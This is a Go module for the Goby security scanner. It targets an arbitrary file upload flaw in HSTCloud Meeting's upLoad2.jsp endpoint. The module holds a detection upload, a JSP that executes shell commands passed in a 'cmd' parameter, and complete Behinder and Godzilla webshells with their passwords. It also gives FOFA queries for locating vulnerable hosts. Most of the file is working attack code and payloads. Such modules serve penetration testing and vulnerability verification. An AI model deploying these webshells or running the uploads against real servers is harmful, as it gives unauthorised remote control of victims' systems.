package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HSTCloud Meeting upLoad2.jsp File Arbitrary File Upload Vulnerability",
    "Description": "<p>Haoshitong Video Conference was developed by Shenzhen Huashi Ruitong Information Technology Co., Ltd., which took the lead in launching 3G Internet Video Conference in China and successfully applied it to the SAAS field.</p><p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Product": "HST-Cloud-CONF",
    "Homepage": "http://www.hst.com/",
    "DisclosureDate": "2023-03-08",
    "Author": "715827922@qq.com",
    "FofaQuery": "(body=\"images/common/logina_1.gif\" || body=\"content=\\\"fsmeeting\" || body=\"type=\\\"hidden\\\" id=\\\"app.index.configsuclogin\")",
    "GobyQuery": "(body=\"images/common/logina_1.gif\" || body=\"content=\\\"fsmeeting\" || body=\"type=\\\"hidden\\\" id=\\\"app.index.configsuclogin\")",
    "Level": "3",
    "Impact": "<p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.example.com\">http://www.hst.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://www.hst.com/index.php"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "testasdad3.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "input the custom file content",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/fm/systemConfig/upLoad2.jsp",
                "follow_redirect": false,
                "header": {
                    "Referer": "http://www.baidu.com",
                    "Cache-Control": "max-age=0",
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=6fd3c9c2585749cfab4804280ef01ab4"
                },
                "data_type": "text",
                "data": "--6fd3c9c2585749cfab4804280ef01ab4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"xISpqyIb.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page contentType=\"text/html; charset=GBK\"%><%@page import=\"java.math.BigInteger\"%><%@page import=\"java.security.MessageDigest\"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--6fd3c9c2585749cfab4804280ef01ab4--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/fm/upload/xISpqyIb.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/fm/systemConfig/upLoad2.jsp",
                "follow_redirect": false,
                "header": {
                    "Referer": "http://www.baidu.com",
                    "Cache-Control": "max-age=0",
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=6fd3c9c2585749cfab4804280ef01ab4"
                },
                "data_type": "text",
                "data": "--6fd3c9c2585749cfab4804280ef01ab4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"xISpqyIb1.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page contentType=\"text/html; charset=UTF-8\" import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\");if(cmd==null||cmd.equals(\"\")) cmd=\"whoami\";try {String name= System.getProperty(\"os.name\");String[] cmds =name!=null&&name.toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\",  cmd}:new String[]{\"sh\", \"-c\", cmd};InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();byte[] buf=new byte[1024];int len=0;ByteArrayOutputStream bout=new ByteArrayOutputStream();while ((len=in.read(buf))!=-1){bout.write(buf,0,len);}response.getWriter().write(new String(bout.toByteArray()));}catch(IOException e) {e.printStackTrace();}out.print(\"|TestFor9527|\");;new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--6fd3c9c2585749cfab4804280ef01ab4--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/fm/upload/xISpqyIb1.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "|TestFor9527|",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)\\|TestFor9527\\|"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "好视通云会议 upLoad2.jsp 文件任意文件上传漏洞",
            "Product": "好视通-云会议",
            "Description": "<p>好视通视频会议是由深圳市华视瑞通信息技术有限公司开发，其在国内率先推出了3G互联网视频会议，并成功应用于SAAS领域。<br></p><p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.example.com\" target=\"_blank\">http://www.hst.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "HSTCloud Meeting upLoad2.jsp File Arbitrary File Upload Vulnerability",
            "Product": "HST-Cloud-CONF",
            "Description": "<p>Haoshitong Video Conference was developed by Shenzhen Huashi Ruitong Information Technology Co., Ltd., which took the lead in launching 3G Internet Video Conference in China and successfully applied it to the SAAS field.<br></p><p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.example.com\" target=\"_blank\">http://www.hst.com/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10836"
}`

	uploadFilesByMuiltipart5455dfsfs := func(hostInfo *httpclient.FixUrl, fileName, content string) string {
		payload := "--1515df1sdfdsfddfs\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + content + "\r\n--1515df1sdfdsfddfs--"
		postRequestConfig := httpclient.NewPostRequestConfig("/fm/systemConfig/upLoad2.jsp")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=1515df1sdfdsfddfs")
		postRequestConfig.Data = payload
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if resp.StatusCode != 302 || err != nil {
			return ""
		}
		return fileName
	}

	checkFileExists551dsfq := func(hostInfo *httpclient.FixUrl, fileName string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/fm/upload/" + fileName)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			fileName := goutils.RandomHexString(8) + ".jsp"
			content := "<%@ page contentType=\"text/html; charset=GBK\"%><%@page import=\"java.math.BigInteger\"%><%@page import=\"java.security.MessageDigest\"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n"
			createdFileName := uploadFilesByMuiltipart5455dfsfs(hostInfo, fileName, content)
			if len(createdFileName) < 1 {
				return false
			}
			resp, err := checkFileExists551dsfq(hostInfo, createdFileName)
			return err == nil && strings.Contains(resp.RawBody, "e10adc3949ba59abbe56e057f20f883e")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var content string
			fileName := goutils.RandomHexString(8) + ".jsp"
			feature := goutils.RandomHexString(8)
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			webshell := goutils.B2S(singleScanConfig.Params["webshell"])
			if attackType == "webshell" {
				if webshell == "behinder" {
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);} out.print("` + feature + `");   %>`
				} else if webshell == "godzilla" {
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}  out.print("` + feature + `");  %>`
				}
			} else if attackType == "custom" {
				fileName = goutils.B2S(singleScanConfig.Params["filename"])
				content = goutils.B2S(singleScanConfig.Params["content"])
			} else {
				expResult.Success = false
				expResult.Output = "Error,Unknown utilization method, please re-enter"
				return expResult
			}
			createdFileName := uploadFilesByMuiltipart5455dfsfs(expResult.HostInfo, fileName, content)
			if len(createdFileName) < 1 {
				expResult.Success = false
				expResult.Output = "Error,Vulnerability exploitation failed"
				return expResult
			}
			resp, err := checkFileExists551dsfq(expResult.HostInfo, createdFileName)
			if err != nil || resp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "Error,exploit fail."
				return expResult
			}
			expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/fm/upload/" + fileName + "\n"
			if attackType == "webshell" && webshell == "behinder" {
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/fm/upload/" + fileName + "\n"
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
				expResult.Output += "Webshell type: jsp"
			} else if attackType == "webshell" && webshell == "godzilla" {
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/fm/upload/" + fileName + "\n"
				expResult.Output += "Password: pass   Keys: key" + "  加密器：JAVA_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
				expResult.Output += "Webshell type: jsp"
			}
			expResult.Success = true
			return expResult
		},
	))
}
